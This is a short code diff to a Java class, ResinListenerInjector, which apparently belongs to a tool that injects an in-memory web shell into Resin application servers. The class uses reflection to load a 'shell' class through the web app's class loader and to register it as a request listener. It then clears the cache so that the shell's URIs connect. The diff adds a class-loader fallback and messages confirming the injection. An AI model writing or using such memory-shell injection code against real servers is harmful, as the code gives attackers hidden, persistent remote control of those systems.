@@ -58,12 +58,17 @@ public class ResinListenerInjector {
         return Arrays.asList(contexts.toArray());
     }
 
+    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "_classLoader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -79,12 +84,14 @@ public class ResinListenerInjector {
         List<Object> listeners = (List<Object>) getFieldValue(context, "_requestListeners");
         for (Object o : listeners) {
             if (o.getClass().getName().contains(getClassName())) {
+                System.out.println("listener already injected");
                 return;
             }
         }
         invokeMethod(context, "addListenerObject", new Class[]{Object.class, boolean.class}, new Object[]{listener, true});
         // 清除缓存，否则某些 uri 无法连接
         invokeMethod(context, "clearCache", null, null);
+        System.out.println("listener injected successfully");
     }
 
     @SuppressWarnings("all")
